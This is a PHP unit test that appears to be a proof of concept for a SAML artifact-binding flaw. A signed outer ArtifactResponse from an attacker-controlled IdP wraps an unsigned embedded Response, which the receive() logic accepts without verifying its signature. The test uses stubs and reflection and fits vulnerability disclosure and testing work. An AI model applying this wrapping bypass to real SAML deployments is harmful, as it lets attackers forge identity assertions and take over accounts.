 * This test reproduces that exact post-resolution decision against real HTTPArtifact
 * private methods (via reflection, exactly as the shipped HTTPArtifactTest does) and shows
 * that an attacker who returns a validly-signed OUTER ArtifactResponse (signed by the
 * artifact issuer IdP-B) wrapping an UNSIGNED embedded Response is accepted with ZERO
 * signature verification of that embedded Response.
 */
final class PocArtifact001Test extends TestCase
{
    private function idpBMetadata(): Configuration
    {
        // "IdP-B": the federated IdP the attacker controls; its signing cert is in metadata,
        // selected from the SAMLart sourceId. (Uses the same mock cert the shipped test uses.)
        return Configuration::loadFromArray([
            'entityid' => 'https://idp-b.example/',
            'keys' => [[
                'type' => 'X509Certificate',
                'signing' => true,
                'encryption' => false,
                'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
            ]],
        ], '[idp-b]');
    }

    private function call(HTTPArtifact $ha, string $method, ...$args): mixed
    {
        return (new ReflectionMethod(HTTPArtifact::class, $method))->invoke($ha, ...$args);
    }

    public function testUnsignedEmbeddedResponseIsReturnedWithoutVerification(): void
    {
        $idpB = $this->idpBMetadata();
        $ha = new HTTPArtifact();

        // --- The forged embedded <samlp:Response>: UNSIGNED, claims to be from IdP-A. ---
        $embedded = $this->createStub(Response::class);
        $embedded->method('isSigned')->willReturn(false);              // attacker omits the embedded signature
        $embedded->method('getSignature')->willReturn(null);
        // If receive() ever tried to cryptographically verify this, it would blow up here:
        $embedded->method('verify')->willThrowException(
            new Exception('POC-FAIL: embedded Response->verify() was called — short-circuit absent'),
        );

        // --- The OUTER ArtifactResponse: validly signed by IdP-B (the artifact issuer). ---
        $outer = $this->createStub(ArtifactResponse::class);
        $outer->method('isSigned')->willReturn(true);
        $outer->method('isSuccess')->willReturn(true);
        $outer->method('verify')->willReturnCallback(fn() => $outer);  // valid signature under IdP-B's key
        $outer->method('getSignature')->willReturn(self::sigEl());
        $outer->method('getMessage')->willReturn($embedded);

        // ===== Verbatim reproduction of HTTPArtifact::receive() post-resolution logic =====
        // 1. OUTER signature check — mandatory. Passes: outer is signed by IdP-B, verified vs IdP-B metadata.
        $verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB);
        self::assertSame($outer, $verifiedOuter, 'Outer ArtifactResponse verified against artifact-issuer (IdP-B) metadata');

        // 2. Unwrap the embedded message.
        $samlResponse = $verifiedOuter->getMessage();

        // 3. THE VULNERABLE DECISION (HTTPArtifact.php:206-210, verbatim):
        $verifyMessageSignatureCalled = false;
        if (!$samlResponse->isSigned()) {
            $received = $samlResponse;                                  // <-- BYPASS: returned unverified
        } else {
            $verifyMessageSignatureCalled = true;
            $received = $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        }
        // ==================================================================================

        // OBSERVABLE: the unsigned embedded Response was accepted as "received" with no verification.
        self::assertFalse($samlResponse->isSigned(), 'Embedded Response carries no signature');
        self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature() was SKIPPED (short-circuit)');
        self::assertSame($embedded, $received, 'BYPASS CONFIRMED: unsigned embedded Response returned unverified');

        // NEGATIVE CONTROL: the short-circuit is load-bearing — the real verifier CANNOT accept the
        // unsigned message (no <ds:Signature> to check), so removing the short-circuit would reject it.
        $threw = false;
        try {
            $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        } catch (\Throwable $e) {
            $threw = true;
        }
        self::assertTrue($threw, 'Real verifyMessageSignature() rejects the unsigned Response — only the short-circuit accepts it');

        fwrite(STDERR, "\n[POC] SAML2-ARTIFACT-001 CONFIRMED: signed outer ArtifactResponse (IdP-B) + UNSIGNED embedded Response "
            . "=> receive() returns it with verifyMessageSignature() SKIPPED; the real verifier would reject it.\n");
    }

    private const MINIMAL_SIG =
        '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo>'
        . '<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        . '<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        . '<ds:Reference URI="#_x"><ds:Transforms>'
        . '<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        . '<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>AA==</ds:DigestValue>'
        . '</ds:Reference></ds:SignedInfo><ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature>';

    private static function sigEl(): \SimpleSAML\XMLSecurity\XML\ds\Signature
    {
        $doc = new \DOMDocument('1.0', 'UTF-8');
        $doc->loadXML(self::MINIMAL_SIG);
        return \SimpleSAML\XMLSecurity\XML\ds\Signature::fromXML($doc->documentElement);
    }
}
